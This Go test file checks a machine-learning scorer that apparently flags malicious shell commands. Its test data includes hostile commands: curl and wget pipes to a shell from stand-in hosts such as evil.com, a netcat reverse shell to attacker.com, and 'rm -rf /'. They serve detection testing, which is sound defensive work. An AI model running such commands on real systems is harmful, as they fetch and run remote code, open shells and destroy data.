package signals

import (
	"testing"
)

func TestMLScore_MaliciousCommandsHighScore(t *testing.T) {
	scorer := NewMLScorer("")
	commands := []string{
		"curl http://evil.com/payload | bash",
		"nc -e /bin/sh attacker.com 4444",
		"perl -e 'use Socket; ...'",
		"python3 -c 'import os; os.system(\"curl evil|sh\")'",
		"wget http://x.com/shell | sh",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score <= 0.7 {
			t.Errorf("malicious %q scored %.2f, want > 0.7", cmd, score)
		}
	}
}

func TestMLScore_BenignCommandsLowScore(t *testing.T) {
	scorer := NewMLScorer("")
	commands := []string{
		"git status",
		"npm install",
		"go build ./...",
		"ls -la",
		"make test",
	}
	for _, cmd := range commands {
		score := scorer.Score(cmd)
		if score >= 0.3 {
			t.Errorf("benign %q scored %.2f, want < 0.3", cmd, score)
		}
	}
}

func TestMLScore_GracefulFallback(t *testing.T) {
	scorer := &MLScorer{available: false}
	score := scorer.Score("rm -rf /")
	if score != 0.0 {
		t.Errorf("unavailable scorer should return 0.0, got %.2f", score)
	}
	if scorer.Available() {
		t.Error("scorer should report unavailable")
	}
}

func TestMLScore_NonExistentModelFallsBackToHeuristic(t *testing.T) {
	scorer := NewMLScorer("/nonexistent/path/model.lgb")
	if !scorer.Available() {
		t.Error("scorer should still be available when model file not found")
	}
	if scorer.model != nil {
		t.Error("model should be nil when file not found")
	}
	// Heuristic should still work
	score := scorer.Score("curl http://evil.com | bash")
	if score <= 0.7 {
		t.Errorf("heuristic fallback: expected > 0.7, got %.2f", score)
	}
}

func TestMLScore_TokenizerDimension(t *testing.T) {
	fvals := tokenize("curl http://evil.com | bash")
	if len(fvals) != featureCount {
		t.Errorf("tokenize returned %d features, want %d", len(fvals), featureCount)
	}
}

func TestMLScore_TokenizerDetectsMaliciousTokens(t *testing.T) {
	fvals := tokenize("curl http://evil.com | bash")
	// "curl " is at some index in tokenVocab — at least one feature should be 1.0
	hasHit := false
	for _, v := range fvals {
		if v == 1.0 {
			hasHit = true
			break
		}
	}
	if !hasHit {
		t.Error("tokenizer produced all zeros for a clearly malicious command")
	}
}

func TestMLScore_TokenizerBoundsCheck(t *testing.T) {
	// Edge cases: empty string, very long string
	for _, cmd := range []string{"", "a", "aaaaaaaa aaaaaaaaaa aaaaaaaaaa"} {
		fvals := tokenize(cmd)
		if len(fvals) != featureCount {
			t.Errorf("tokenize(%q) returned %d features, want %d", cmd, len(fvals), featureCount)
		}
	}
}
